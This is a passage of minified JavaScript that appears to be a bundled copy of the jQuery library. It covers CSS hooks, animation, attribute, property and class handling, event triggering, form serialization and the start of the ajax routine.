                  a = !g.scrollboxSize() && "absolute" === o.position,
                  u = (a || r) && "border-box" === T.css(e, "boxSizing", !1, o),
                  s = r ? rt(e, t, r, u, o) : 0;
                return u && a && (s -= Math.ceil(e["offset" + t[0].toUpperCase() + t.slice(1)] - parseFloat(o[t]) - rt(e, t, "border", !1, o) - .5)), s && (i = ie.exec(n)) && "px" !== (i[3] || "px") && (e.style[t] = n, n = T.css(e, t)), nt(0, n, s);
              }
            };
          }), T.cssHooks.marginLeft = Ve(g.reliableMarginLeft, function (e, t) {
            if (t) return (parseFloat(Ye(e, "marginLeft")) || e.getBoundingClientRect().left - We(e, {
              marginLeft: 0
            }, function () {
              return e.getBoundingClientRect().left;
            })) + "px";
          }), T.each({
            margin: "",
            padding: "",
            border: "Width"
          }, function (e, t) {
            T.cssHooks[e + t] = {
              expand: function (n) {
                for (var r = 0, i = {}, o = "string" == typeof n ? n.split(" ") : [n]; r < 4; r++) i[e + oe[r] + t] = o[r] || o[r - 2] || o[0];
                return i;
              }
            }, "margin" !== e && (T.cssHooks[e + t].set = nt);
          }), T.fn.extend({
            css: function (e, t) {
              return z(this, function (e, t, n) {
                var r,
                  i,
                  o = {},
                  a = 0;
                if (Array.isArray(t)) {
                  for (r = He(e), i = t.length; a < i; a++) o[t[a]] = T.css(e, t[a], !1, r);
                  return o;
                }
                return void 0 !== n ? T.style(e, t, n) : T.css(e, t);
              }, e, t, arguments.length > 1);
            }
          }), T.Tween = ot, ot.prototype = {
            constructor: ot,
            init: function (e, t, n, r, i, o) {
              this.elem = e, this.prop = n, this.easing = i || T.easing._default, this.options = t, this.start = this.now = this.cur(), this.end = r, this.unit = o || (T.cssNumber[n] ? "" : "px");
            },
            cur: function () {
              var e = ot.propHooks[this.prop];
              return e && e.get ? e.get(this) : ot.propHooks._default.get(this);
            },
            run: function (e) {
              var t,
                n = ot.propHooks[this.prop];
              return this.options.duration ? this.pos = t = T.easing[this.easing](e, this.options.duration * e, 0, 1, this.options.duration) : this.pos = t = e, this.now = (this.end - this.start) * t + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), n && n.set ? n.set(this) : ot.propHooks._default.set(this), this;
            }
          }, ot.prototype.init.prototype = ot.prototype, ot.propHooks = {
            _default: {
              get: function (e) {
                var t;
                return 1 !== e.elem.nodeType || null != e.elem[e.prop] && null == e.elem.style[e.prop] ? e.elem[e.prop] : (t = T.css(e.elem, e.prop, "")) && "auto" !== t ? t : 0;
              },
              set: function (e) {
                T.fx.step[e.prop] ? T.fx.step[e.prop](e) : 1 !== e.elem.nodeType || !T.cssHooks[e.prop] && null == e.elem.style[Je(e.prop)] ? e.elem[e.prop] = e.now : T.style(e.elem, e.prop, e.now + e.unit);
              }
            }
          }, ot.propHooks.scrollTop = ot.propHooks.scrollLeft = {
            set: function (e) {
              e.elem.nodeType && e.elem.parentNode && (e.elem[e.prop] = e.now);
            }
          }, T.easing = {
            linear: function (e) {
              return e;
            },
            swing: function (e) {
              return .5 - Math.cos(e * Math.PI) / 2;
            },
            _default: "swing"
          }, T.fx = ot.prototype.init, T.fx.step = {};
          var at,
            ut,
            st = /^(?:toggle|show|hide)$/,
            dt = /queueHooks$/;
          function lt() {
            ut && (!1 === b.hidden && r.requestAnimationFrame ? r.requestAnimationFrame(lt) : r.setTimeout(lt, T.fx.interval), T.fx.tick());
          }
          function ct() {
            return r.setTimeout(function () {
              at = void 0;
            }), at = Date.now();
          }
          function ft(e, t) {
            var n,
              r = 0,
              i = {
                height: e
              };
            for (t = t ? 1 : 0; r < 4; r += 2 - t) i["margin" + (n = oe[r])] = i["padding" + n] = e;
            return t && (i.opacity = i.width = e), i;
          }
          function ht(e, t, n) {
            for (var r, i = (pt.tweeners[t] || []).concat(pt.tweeners["*"]), o = 0, a = i.length; o < a; o++) if (r = i[o].call(n, t, e)) return r;
          }
          function pt(e, t, n) {
            var r,
              i,
              o = 0,
              a = pt.prefilters.length,
              u = T.Deferred().always(function () {
                delete s.elem;
              }),
              s = function () {
                if (i) return !1;
                for (var t = at || ct(), n = Math.max(0, d.startTime + d.duration - t), r = 1 - (n / d.duration || 0), o = 0, a = d.tweens.length; o < a; o++) d.tweens[o].run(r);
                return u.notifyWith(e, [d, r, n]), r < 1 && a ? n : (a || u.notifyWith(e, [d, 1, 0]), u.resolveWith(e, [d]), !1);
              },
              d = u.promise({
                elem: e,
                props: T.extend({}, t),
                opts: T.extend(!0, {
                  specialEasing: {},
                  easing: T.easing._default
                }, n),
                originalProperties: t,
                originalOptions: n,
                startTime: at || ct(),
                duration: n.duration,
                tweens: [],
                createTween: function (t, n) {
                  var r = T.Tween(e, d.opts, t, n, d.opts.specialEasing[t] || d.opts.easing);
                  return d.tweens.push(r), r;
                },
                stop: function (t) {
                  var n = 0,
                    r = t ? d.tweens.length : 0;
                  if (i) return this;
                  for (i = !0; n < r; n++) d.tweens[n].run(1);
                  return t ? (u.notifyWith(e, [d, 1, 0]), u.resolveWith(e, [d, t])) : u.rejectWith(e, [d, t]), this;
                }
              }),
              l = d.props;
            for (!function (e, t) {
              var n, r, i, o, a;
              for (n in e) if (i = t[r = X(n)], o = e[n], Array.isArray(o) && (i = o[1], o = e[n] = o[0]), n !== r && (e[r] = o, delete e[n]), (a = T.cssHooks[r]) && "expand" in a) for (n in o = a.expand(o), delete e[r], o) n in e || (e[n] = o[n], t[n] = i);else t[r] = i;
            }(l, d.opts.specialEasing); o < a; o++) if (r = pt.prefilters[o].call(d, e, l, d.opts)) return v(r.stop) && (T._queueHooks(d.elem, d.opts.queue).stop = r.stop.bind(r)), r;
            return T.map(l, ht, d), v(d.opts.start) && d.opts.start.call(e, d), d.progress(d.opts.progress).done(d.opts.done, d.opts.complete).fail(d.opts.fail).always(d.opts.always), T.fx.timer(T.extend(s, {
              elem: e,
              anim: d,
              queue: d.opts.queue
            })), d;
          }
          T.Animation = T.extend(pt, {
            tweeners: {
              "*": [function (e, t) {
                var n = this.createTween(e, t);
                return le(n.elem, e, ie.exec(t), n), n;
              }]
            },
            tweener: function (e, t) {
              v(e) ? (t = e, e = ["*"]) : e = e.match(F);
              for (var n, r = 0, i = e.length; r < i; r++) n = e[r], pt.tweeners[n] = pt.tweeners[n] || [], pt.tweeners[n].unshift(t);
            },
            prefilters: [function (e, t, n) {
              var r,
                i,
                o,
                a,
                u,
                s,
                d,
                l,
                c = "width" in t || "height" in t,
                f = this,
                h = {},
                p = e.style,
                m = e.nodeType && de(e),
                g = G.get(e, "fxshow");
              for (r in n.queue || (null == (a = T._queueHooks(e, "fx")).unqueued && (a.unqueued = 0, u = a.empty.fire, a.empty.fire = function () {
                a.unqueued || u();
              }), a.unqueued++, f.always(function () {
                f.always(function () {
                  a.unqueued--, T.queue(e, "fx").length || a.empty.fire();
                });
              })), t) if (i = t[r], st.test(i)) {
                if (delete t[r], o = o || "toggle" === i, i === (m ? "hide" : "show")) {
                  if ("show" !== i || !g || void 0 === g[r]) continue;
                  m = !0;
                }
                h[r] = g && g[r] || T.style(e, r);
              }
              if ((s = !T.isEmptyObject(t)) || !T.isEmptyObject(h)) for (r in c && 1 === e.nodeType && (n.overflow = [p.overflow, p.overflowX, p.overflowY], null == (d = g && g.display) && (d = G.get(e, "display")), "none" === (l = T.css(e, "display")) && (d ? l = d : (he([e], !0), d = e.style.display || d, l = T.css(e, "display"), he([e]))), ("inline" === l || "inline-block" === l && null != d) && "none" === T.css(e, "float") && (s || (f.done(function () {
                p.display = d;
              }), null == d && (l = p.display, d = "none" === l ? "" : l)), p.display = "inline-block")), n.overflow && (p.overflow = "hidden", f.always(function () {
                p.overflow = n.overflow[0], p.overflowX = n.overflow[1], p.overflowY = n.overflow[2];
              })), s = !1, h) s || (g ? "hidden" in g && (m = g.hidden) : g = G.access(e, "fxshow", {
                display: d
              }), o && (g.hidden = !m), m && he([e], !0), f.done(function () {
                for (r in m || he([e]), G.remove(e, "fxshow"), h) T.style(e, r, h[r]);
              })), s = ht(m ? g[r] : 0, r, f), r in g || (g[r] = s.start, m && (s.end = s.start, s.start = 0));
            }],
            prefilter: function (e, t) {
              t ? pt.prefilters.unshift(e) : pt.prefilters.push(e);
            }
          }), T.speed = function (e, t, n) {
            var r = e && "object" == typeof e ? T.extend({}, e) : {
              complete: n || !n && t || v(e) && e,
              duration: e,
              easing: n && t || t && !v(t) && t
            };
            return T.fx.off ? r.duration = 0 : "number" != typeof r.duration && (r.duration in T.fx.speeds ? r.duration = T.fx.speeds[r.duration] : r.duration = T.fx.speeds._default), null != r.queue && !0 !== r.queue || (r.queue = "fx"), r.old = r.complete, r.complete = function () {
              v(r.old) && r.old.call(this), r.queue && T.dequeue(this, r.queue);
            }, r;
          }, T.fn.extend({
            fadeTo: function (e, t, n, r) {
              return this.filter(de).css("opacity", 0).show().end().animate({
                opacity: t
              }, e, n, r);
            },
            animate: function (e, t, n, r) {
              var i = T.isEmptyObject(e),
                o = T.speed(t, n, r),
                a = function () {
                  var t = pt(this, T.extend({}, e), o);
                  (i || G.get(this, "finish")) && t.stop(!0);
                };
              return a.finish = a, i || !1 === o.queue ? this.each(a) : this.queue(o.queue, a);
            },
            stop: function (e, t, n) {
              var r = function (e) {
                var t = e.stop;
                delete e.stop, t(n);
              };
              return "string" != typeof e && (n = t, t = e, e = void 0), t && this.queue(e || "fx", []), this.each(function () {
                var t = !0,
                  i = null != e && e + "queueHooks",
                  o = T.timers,
                  a = G.get(this);
                if (i) a[i] && a[i].stop && r(a[i]);else for (i in a) a[i] && a[i].stop && dt.test(i) && r(a[i]);
                for (i = o.length; i--;) o[i].elem !== this || null != e && o[i].queue !== e || (o[i].anim.stop(n), t = !1, o.splice(i, 1));
                !t && n || T.dequeue(this, e);
              });
            },
            finish: function (e) {
              return !1 !== e && (e = e || "fx"), this.each(function () {
                var t,
                  n = G.get(this),
                  r = n[e + "queue"],
                  i = n[e + "queueHooks"],
                  o = T.timers,
                  a = r ? r.length : 0;
                for (n.finish = !0, T.queue(this, e, []), i && i.stop && i.stop.call(this, !0), t = o.length; t--;) o[t].elem === this && o[t].queue === e && (o[t].anim.stop(!0), o.splice(t, 1));
                for (t = 0; t < a; t++) r[t] && r[t].finish && r[t].finish.call(this);
                delete n.finish;
              });
            }
          }), T.each(["toggle", "show", "hide"], function (e, t) {
            var n = T.fn[t];
            T.fn[t] = function (e, r, i) {
              return null == e || "boolean" == typeof e ? n.apply(this, arguments) : this.animate(ft(t, !0), e, r, i);
            };
          }), T.each({
            slideDown: ft("show"),
            slideUp: ft("hide"),
            slideToggle: ft("toggle"),
            fadeIn: {
              opacity: "show"
            },
            fadeOut: {
              opacity: "hide"
            },
            fadeToggle: {
              opacity: "toggle"
            }
          }, function (e, t) {
            T.fn[e] = function (e, n, r) {
              return this.animate(t, e, n, r);
            };
          }), T.timers = [], T.fx.tick = function () {
            var e,
              t = 0,
              n = T.timers;
            for (at = Date.now(); t < n.length; t++) (e = n[t])() || n[t] !== e || n.splice(t--, 1);
            n.length || T.fx.stop(), at = void 0;
          }, T.fx.timer = function (e) {
            T.timers.push(e), T.fx.start();
          }, T.fx.interval = 13, T.fx.start = function () {
            ut || (ut = !0, lt());
          }, T.fx.stop = function () {
            ut = null;
          }, T.fx.speeds = {
            slow: 600,
            fast: 200,
            _default: 400
          }, T.fn.delay = function (e, t) {
            return e = T.fx && T.fx.speeds[e] || e, t = t || "fx", this.queue(t, function (t, n) {
              var i = r.setTimeout(t, e);
              n.stop = function () {
                r.clearTimeout(i);
              };
            });
          }, function () {
            var e = b.createElement("input"),
              t = b.createElement("select").appendChild(b.createElement("option"));
            e.type = "checkbox", g.checkOn = "" !== e.value, g.optSelected = t.selected, (e = b.createElement("input")).value = "t", e.type = "radio", g.radioValue = "t" === e.value;
          }();
          var mt,
            gt = T.expr.attrHandle;
          T.fn.extend({
            attr: function (e, t) {
              return z(this, T.attr, e, t, arguments.length > 1);
            },
            removeAttr: function (e) {
              return this.each(function () {
                T.removeAttr(this, e);
              });
            }
          }), T.extend({
            attr: function (e, t, n) {
              var r,
                i,
                o = e.nodeType;
              if (3 !== o && 8 !== o && 2 !== o) return void 0 === e.getAttribute ? T.prop(e, t, n) : (1 === o && T.isXMLDoc(e) || (i = T.attrHooks[t.toLowerCase()] || (T.expr.match.bool.test(t) ? mt : void 0)), void 0 !== n ? null === n ? void T.removeAttr(e, t) : i && "set" in i && void 0 !== (r = i.set(e, n, t)) ? r : (e.setAttribute(t, n + ""), n) : i && "get" in i && null !== (r = i.get(e, t)) ? r : null == (r = T.find.attr(e, t)) ? void 0 : r);
            },
            attrHooks: {
              type: {
                set: function (e, t) {
                  if (!g.radioValue && "radio" === t && k(e, "input")) {
                    var n = e.value;
                    return e.setAttribute("type", t), n && (e.value = n), t;
                  }
                }
              }
            },
            removeAttr: function (e, t) {
              var n,
                r = 0,
                i = t && t.match(F);
              if (i && 1 === e.nodeType) for (; n = i[r++];) e.removeAttribute(n);
            }
          }), mt = {
            set: function (e, t, n) {
              return !1 === t ? T.removeAttr(e, n) : e.setAttribute(n, n), n;
            }
          }, T.each(T.expr.match.bool.source.match(/\w+/g), function (e, t) {
            var n = gt[t] || T.find.attr;
            gt[t] = function (e, t, r) {
              var i,
                o,
                a = t.toLowerCase();
              return r || (o = gt[a], gt[a] = i, i = null != n(e, t, r) ? a : null, gt[a] = o), i;
            };
          });
          var vt = /^(?:input|select|textarea|button)$/i,
            yt = /^(?:a|area)$/i;
          function bt(e) {
            return (e.match(F) || []).join(" ");
          }
          function wt(e) {
            return e.getAttribute && e.getAttribute("class") || "";
          }
          function _t(e) {
            return Array.isArray(e) ? e : "string" == typeof e && e.match(F) || [];
          }
          T.fn.extend({
            prop: function (e, t) {
              return z(this, T.prop, e, t, arguments.length > 1);
            },
            removeProp: function (e) {
              return this.each(function () {
                delete this[T.propFix[e] || e];
              });
            }
          }), T.extend({
            prop: function (e, t, n) {
              var r,
                i,
                o = e.nodeType;
              if (3 !== o && 8 !== o && 2 !== o) return 1 === o && T.isXMLDoc(e) || (t = T.propFix[t] || t, i = T.propHooks[t]), void 0 !== n ? i && "set" in i && void 0 !== (r = i.set(e, n, t)) ? r : e[t] = n : i && "get" in i && null !== (r = i.get(e, t)) ? r : e[t];
            },
            propHooks: {
              tabIndex: {
                get: function (e) {
                  var t = T.find.attr(e, "tabindex");
                  return t ? parseInt(t, 10) : vt.test(e.nodeName) || yt.test(e.nodeName) && e.href ? 0 : -1;
                }
              }
            },
            propFix: {
              for: "htmlFor",
              class: "className"
            }
          }), g.optSelected || (T.propHooks.selected = {
            get: function (e) {
              var t = e.parentNode;
              return t && t.parentNode && t.parentNode.selectedIndex, null;
            },
            set: function (e) {
              var t = e.parentNode;
              t && (t.selectedIndex, t.parentNode && t.parentNode.selectedIndex);
            }
          }), T.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], function () {
            T.propFix[this.toLowerCase()] = this;
          }), T.fn.extend({
            addClass: function (e) {
              var t,
                n,
                r,
                i,
                o,
                a,
                u,
                s = 0;
              if (v(e)) return this.each(function (t) {
                T(this).addClass(e.call(this, t, wt(this)));
              });
              if ((t = _t(e)).length) for (; n = this[s++];) if (i = wt(n), r = 1 === n.nodeType && " " + bt(i) + " ") {
                for (a = 0; o = t[a++];) r.indexOf(" " + o + " ") < 0 && (r += o + " ");
                i !== (u = bt(r)) && n.setAttribute("class", u);
              }
              return this;
            },
            removeClass: function (e) {
              var t,
                n,
                r,
                i,
                o,
                a,
                u,
                s = 0;
              if (v(e)) return this.each(function (t) {
                T(this).removeClass(e.call(this, t, wt(this)));
              });
              if (!arguments.length) return this.attr("class", "");
              if ((t = _t(e)).length) for (; n = this[s++];) if (i = wt(n), r = 1 === n.nodeType && " " + bt(i) + " ") {
                for (a = 0; o = t[a++];) for (; r.indexOf(" " + o + " ") > -1;) r = r.replace(" " + o + " ", " ");
                i !== (u = bt(r)) && n.setAttribute("class", u);
              }
              return this;
            },
            toggleClass: function (e, t) {
              var n = typeof e,
                r = "string" === n || Array.isArray(e);
              return "boolean" == typeof t && r ? t ? this.addClass(e) : this.removeClass(e) : v(e) ? this.each(function (n) {
                T(this).toggleClass(e.call(this, n, wt(this), t), t);
              }) : this.each(function () {
                var t, i, o, a;
                if (r) for (i = 0, o = T(this), a = _t(e); t = a[i++];) o.hasClass(t) ? o.removeClass(t) : o.addClass(t);else void 0 !== e && "boolean" !== n || ((t = wt(this)) && G.set(this, "__className__", t), this.setAttribute && this.setAttribute("class", t || !1 === e ? "" : G.get(this, "__className__") || ""));
              });
            },
            hasClass: function (e) {
              var t,
                n,
                r = 0;
              for (t = " " + e + " "; n = this[r++];) if (1 === n.nodeType && (" " + bt(wt(n)) + " ").indexOf(t) > -1) return !0;
              return !1;
            }
          });
          var Et = /\r/g;
          T.fn.extend({
            val: function (e) {
              var t,
                n,
                r,
                i = this[0];
              return arguments.length ? (r = v(e), this.each(function (n) {
                var i;
                1 === this.nodeType && (null == (i = r ? e.call(this, n, T(this).val()) : e) ? i = "" : "number" == typeof i ? i += "" : Array.isArray(i) && (i = T.map(i, function (e) {
                  return null == e ? "" : e + "";
                })), (t = T.valHooks[this.type] || T.valHooks[this.nodeName.toLowerCase()]) && "set" in t && void 0 !== t.set(this, i, "value") || (this.value = i));
              })) : i ? (t = T.valHooks[i.type] || T.valHooks[i.nodeName.toLowerCase()]) && "get" in t && void 0 !== (n = t.get(i, "value")) ? n : "string" == typeof (n = i.value) ? n.replace(Et, "") : null == n ? "" : n : void 0;
            }
          }), T.extend({
            valHooks: {
              option: {
                get: function (e) {
                  var t = T.find.attr(e, "value");
                  return null != t ? t : bt(T.text(e));
                }
              },
              select: {
                get: function (e) {
                  var t,
                    n,
                    r,
                    i = e.options,
                    o = e.selectedIndex,
                    a = "select-one" === e.type,
                    u = a ? null : [],
                    s = a ? o + 1 : i.length;
                  for (r = o < 0 ? s : a ? o : 0; r < s; r++) if (((n = i[r]).selected || r === o) && !n.disabled && (!n.parentNode.disabled || !k(n.parentNode, "optgroup"))) {
                    if (t = T(n).val(), a) return t;
                    u.push(t);
                  }
                  return u;
                },
                set: function (e, t) {
                  for (var n, r, i = e.options, o = T.makeArray(t), a = i.length; a--;) ((r = i[a]).selected = T.inArray(T.valHooks.option.get(r), o) > -1) && (n = !0);
                  return n || (e.selectedIndex = -1), o;
                }
              }
            }
          }), T.each(["radio", "checkbox"], function () {
            T.valHooks[this] = {
              set: function (e, t) {
                if (Array.isArray(t)) return e.checked = T.inArray(T(e).val(), t) > -1;
              }
            }, g.checkOn || (T.valHooks[this].get = function (e) {
              return null === e.getAttribute("value") ? "on" : e.value;
            });
          }), g.focusin = "onfocusin" in r;
          var xt = /^(?:focusinfocus|focusoutblur)$/,
            Tt = function (e) {
              e.stopPropagation();
            };
          T.extend(T.event, {
            trigger: function (e, t, n, i) {
              var o,
                a,
                u,
                s,
                d,
                l,
                c,
                f,
                p = [n || b],
                m = h.call(e, "type") ? e.type : e,
                g = h.call(e, "namespace") ? e.namespace.split(".") : [];
              if (a = f = u = n = n || b, 3 !== n.nodeType && 8 !== n.nodeType && !xt.test(m + T.event.triggered) && (m.indexOf(".") > -1 && (g = m.split("."), m = g.shift(), g.sort()), d = m.indexOf(":") < 0 && "on" + m, (e = e[T.expando] ? e : new T.Event(m, "object" == typeof e && e)).isTrigger = i ? 2 : 3, e.namespace = g.join("."), e.rnamespace = e.namespace ? new RegExp("(^|\\.)" + g.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, e.result = void 0, e.target || (e.target = n), t = null == t ? [e] : T.makeArray(t, [e]), c = T.event.special[m] || {}, i || !c.trigger || !1 !== c.trigger.apply(n, t))) {
                if (!i && !c.noBubble && !y(n)) {
                  for (s = c.delegateType || m, xt.test(s + m) || (a = a.parentNode); a; a = a.parentNode) p.push(a), u = a;
                  u === (n.ownerDocument || b) && p.push(u.defaultView || u.parentWindow || r);
                }
                for (o = 0; (a = p[o++]) && !e.isPropagationStopped();) f = a, e.type = o > 1 ? s : c.bindType || m, (l = (G.get(a, "events") || Object.create(null))[e.type] && G.get(a, "handle")) && l.apply(a, t), (l = d && a[d]) && l.apply && K(a) && (e.result = l.apply(a, t), !1 === e.result && e.preventDefault());
                return e.type = m, i || e.isDefaultPrevented() || c._default && !1 !== c._default.apply(p.pop(), t) || !K(n) || d && v(n[m]) && !y(n) && ((u = n[d]) && (n[d] = null), T.event.triggered = m, e.isPropagationStopped() && f.addEventListener(m, Tt), n[m](), e.isPropagationStopped() && f.removeEventListener(m, Tt), T.event.triggered = void 0, u && (n[d] = u)), e.result;
              }
            },
            simulate: function (e, t, n) {
              var r = T.extend(new T.Event(), n, {
                type: e,
                isSimulated: !0
              });
              T.event.trigger(r, null, t);
            }
          }), T.fn.extend({
            trigger: function (e, t) {
              return this.each(function () {
                T.event.trigger(e, t, this);
              });
            },
            triggerHandler: function (e, t) {
              var n = this[0];
              if (n) return T.event.trigger(e, t, n, !0);
            }
          }), g.focusin || T.each({
            focus: "focusin",
            blur: "focusout"
          }, function (e, t) {
            var n = function (e) {
              T.event.simulate(t, e.target, T.event.fix(e));
            };
            T.event.special[t] = {
              setup: function () {
                var r = this.ownerDocument || this.document || this,
                  i = G.access(r, t);
                i || r.addEventListener(e, n, !0), G.access(r, t, (i || 0) + 1);
              },
              teardown: function () {
                var r = this.ownerDocument || this.document || this,
                  i = G.access(r, t) - 1;
                i ? G.access(r, t, i) : (r.removeEventListener(e, n, !0), G.remove(r, t));
              }
            };
          });
          var Ct = r.location,
            St = {
              guid: Date.now()
            },
            Dt = /\?/;
          T.parseXML = function (e) {
            var t;
            if (!e || "string" != typeof e) return null;
            try {
              t = new r.DOMParser().parseFromString(e, "text/xml");
            } catch (e) {
              t = void 0;
            }
            return t && !t.getElementsByTagName("parsererror").length || T.error("Invalid XML: " + e), t;
          };
          var At = /\[\]$/,
            $t = /\r?\n/g,
            kt = /^(?:submit|button|image|reset|file)$/i,
            Nt = /^(?:input|select|textarea|keygen)/i;
          function Ot(e, t, n, r) {
            var i;
            if (Array.isArray(t)) T.each(t, function (t, i) {
              n || At.test(e) ? r(e, i) : Ot(e + "[" + ("object" == typeof i && null != i ? t : "") + "]", i, n, r);
            });else if (n || "object" !== E(t)) r(e, t);else for (i in t) Ot(e + "[" + i + "]", t[i], n, r);
          }
          T.param = function (e, t) {
            var n,
              r = [],
              i = function (e, t) {
                var n = v(t) ? t() : t;
                r[r.length] = encodeURIComponent(e) + "=" + encodeURIComponent(null == n ? "" : n);
              };
            if (null == e) return "";
            if (Array.isArray(e) || e.jquery && !T.isPlainObject(e)) T.each(e, function () {
              i(this.name, this.value);
            });else for (n in e) Ot(n, e[n], t, i);
            return r.join("&");
          }, T.fn.extend({
            serialize: function () {
              return T.param(this.serializeArray());
            },
            serializeArray: function () {
              return this.map(function () {
                var e = T.prop(this, "elements");
                return e ? T.makeArray(e) : this;
              }).filter(function () {
                var e = this.type;
                return this.name && !T(this).is(":disabled") && Nt.test(this.nodeName) && !kt.test(e) && (this.checked || !ge.test(e));
              }).map(function (e, t) {
                var n = T(this).val();
                return null == n ? null : Array.isArray(n) ? T.map(n, function (e) {
                  return {
                    name: t.name,
                    value: e.replace($t, "\r\n")
                  };
                }) : {
                  name: t.name,
                  value: n.replace($t, "\r\n")
                };
              }).get();
            }
          });
          var jt = /%20/g,
            Rt = /#.*$/,
            Pt = /([?&])_=[^&]*/,
            Lt = /^(.*?):[ \t]*([^\r\n]*)$/gm,
            It = /^(?:GET|HEAD)$/,
            Ft = /^\/\//,
            Bt = {},
            Mt = {},
            Ut = "*/".concat("*"),
            qt = b.createElement("a");
          function Ht(e) {
            return function (t, n) {
              "string" != typeof t && (n = t, t = "*");
              var r,
                i = 0,
                o = t.toLowerCase().match(F) || [];
              if (v(n)) for (; r = o[i++];) "+" === r[0] ? (r = r.slice(1) || "*", (e[r] = e[r] || []).unshift(n)) : (e[r] = e[r] || []).push(n);
            };
          }
          function Wt(e, t, n, r) {
            var i = {},
              o = e === Mt;
            function a(u) {
              var s;
              return i[u] = !0, T.each(e[u] || [], function (e, u) {
                var d = u(t, n, r);
                return "string" != typeof d || o || i[d] ? o ? !(s = d) : void 0 : (t.dataTypes.unshift(d), a(d), !1);
              }), s;
            }
            return a(t.dataTypes[0]) || !i["*"] && a("*");
          }
          function zt(e, t) {
            var n,
              r,
              i = T.ajaxSettings.flatOptions || {};
            for (n in t) void 0 !== t[n] && ((i[n] ? e : r || (r = {}))[n] = t[n]);
            return r && T.extend(!0, e, r), e;
          }
          qt.href = Ct.href, T.extend({
            active: 0,
            lastModified: {},
            etag: {},
            ajaxSettings: {
              url: Ct.href,
              type: "GET",
              isLocal: /^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(Ct.protocol),
              global: !0,
              processData: !0,
              async: !0,
              contentType: "application/x-www-form-urlencoded; charset=UTF-8",
              accepts: {
                "*": Ut,
                text: "text/plain",
                html: "text/html",
                xml: "application/xml, text/xml",
                json: "application/json, text/javascript"
              },
              contents: {
                xml: /\bxml\b/,
                html: /\bhtml/,
                json: /\bjson\b/
              },
              responseFields: {
                xml: "responseXML",
                text: "responseText",
                json: "responseJSON"
              },
              converters: {
                "* text": String,
                "text html": !0,
                "text json": JSON.parse,
                "text xml": T.parseXML
              },
              flatOptions: {
                url: !0,
                context: !0
              }
            },
            ajaxSetup: function (e, t) {
              return t ? zt(zt(e, T.ajaxSettings), t) : zt(T.ajaxSettings, e);
            },
            ajaxPrefilter: Ht(Bt),
            ajaxTransport: Ht(Mt),
            ajax: function (e, t) {
              "object" == typeof e && (t = e, e = void 0), t = t || {};
              var n,
                i,
                o,
                a,
                u,
                s,
                d,
                l,
                c,
                f,
                h = T.ajaxSetup({}, t),
                p = h.context || h,
                m = h.context && (p.nodeType || p.jquery) ? T(p) : T.event,
                g = T.Deferred(),
                v = T.Callbacks("once memory"),
                y = h.statusCode || {},
                w = {},
                _ = {},
                E = "canceled",
                x = {
                  readyState: 0,
                  getResponseHeader: function (e) {
                    var t;
                    if (d) {
                      if (!a) for (a = {}; t = Lt.exec(o);) a[t[1].toLowerCase() + " "] = (a[t[1].toLowerCase() + " "] || []).concat(t[2]);
                      t = a[e.toLowerCase() + " "];
                    }
                    return null == t ? null : t.join(", ");
                  },
                  getAllResponseHeaders: function () {
                    return d ? o : null;
                  },
                  setRequestHeader: function (e, t) {
                    return null == d && (e = _[e.toLowerCase()] = _[e.toLowerCase()] || e, w[e] = t), this;
                  },
                  overrideMimeType: function (e) {
                    return null == d && (h.mimeType = e), this;
                  },
                  statusCode: function (e) {
                    var t;
                    if (e) if (d) x.always(e[x.status]);else for (t in e) y[t] = [y[t], e[t]];
                    return this;
                  },
                  abort: function (e) {
                    var t = e || E;
                    return n && n.abort(t), C(0, t), this;
                  }
                };
              if (g.promise(x), h.url = ((e || h.url || Ct.href) + "").replace(Ft, Ct.protocol + "//"), h.type = t.method || t.type || h.method || h.type, h.dataTypes = (h.dataType || "*").toLowerCase().match(F) || [""], null == h.crossDomain) {
                s = b.createElement("a");
                try {
                  s.href = h.url, s.href = s.href, h.crossDomain = qt.protocol + "//" + qt.host != s.protocol + "//" + s.host;
                } catch (e) {
                  h.crossDomain = !0;
                }
              }
              if (h.data && h.processData && "string" != typeof h.data && (h.data = T.param(h.data, h.traditional)), Wt(Bt, h, t, x), d) return x;
              for (c in (l = T.event && h.global) && 0 == T.active++ && T.event.trigger("ajaxStart"), h.type = h.type.toUpperCase(), h.hasContent = !It.test(h.type), i = h.url.replace(Rt, ""), h.hasContent ? h.data && h.processData && 0 === (h.contentType || "").indexOf("application/x-www-form-urlencoded") && (h.data = h.data.replace(jt, "+")) : (f = h.url.slice(i.length), h.data && (h.processData || "string" == typeof h.data) && (i += (Dt.test(i) ? "&" : "?") + h.data, delete h.data), !1 === h.cache && (i = i.replace(Pt, "$1"), f = (Dt.test(i) ? "&" : "?") + "_=" + St.guid++ + f), h.url = i + f), h.ifModified && (T.lastModified[i] && x.setRequestHeader("If-Modified-Since", T.lastModified[i]), T.etag[i] && x.setRequestHeader("If-None-Match", T.etag[i])), (h.data && h.hasContent && !1 !== h.contentType || t.contentType) && x.setRequestHeader("Content-Type", h.contentType), x.setRequestHeader("Accept", h.dataTypes[0] && h.accepts[h.dataTypes[0]] ? h.accepts[h.dataTypes[0]] + ("*" !== h.dataTypes[0] ? ", " + Ut + "; q=0.01" : "") : h.accepts["*"]), h.headers) x.setRequestHeader(c, h.headers[c]);
              if (h.beforeSend && (!1 === h.beforeSend.call(p, x, h) || d)) return x.abort();
              if (E = "abort", v.add(h.complete), x.done(h.success), x.fail(h.error), n = Wt(Mt, h, t, x)) {
                if (x.readyState = 1, l && m.trigger("ajaxSend", [x, h]), d) return x;
                h.async && h.timeout > 0 && (u = r.setTimeout(function () {
                  x.abort("timeout");
                }, h.timeout));
                try {
                  d = !1, n.send(w, C);
                } catch (e) {
                  if (d) throw e;
                  C(-1, e);
                }
              } else C(-1, "No Transport");
              function C(e, t, a, s) {
                var c,
                  f,
                  b,
                  w,
                  _,
                  E = t;
                d || (d = !0, u && r.clearTimeout(u), n = void 0, o = s || "", x.readyState = e > 0 ? 4 : 0, c = e >= 200 && e < 300 || 304 === e, a && (w = function (e, t, n) {
                  for (var r, i, o, a, u = e.contents, s = e.dataTypes; "*" === s[0];) s.shift(), void 0 === r && (r = e.mimeType || t.getResponseHeader("Content-Type"));
                  if (r) for (i in u) if (u[i] && u[i].test(r)) {
                    s.unshift(i);
                    break;
                  }
                  if (s[0] in n) o = s[0];else {
                    for (i in n) {
                      if (!s[0] || e.converters[i + " " + s[0]]) {
                        o = i;
                        break;
                      }
                      a || (a = i);
                    }
